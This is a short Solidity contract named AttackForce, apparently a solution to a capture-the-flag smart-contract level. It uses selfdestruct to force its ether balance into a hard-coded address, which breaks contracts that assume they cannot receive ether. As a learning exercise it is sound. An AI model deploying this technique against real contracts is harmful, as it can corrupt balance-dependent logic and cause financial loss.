// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract AttackForce {
    constructor() public payable {}

    function forced() public payable {
        selfdestruct(
            payable(address(0x21C12cb847eB59A89Fa08D2A343A5c888e95111A))
        );
    }
}
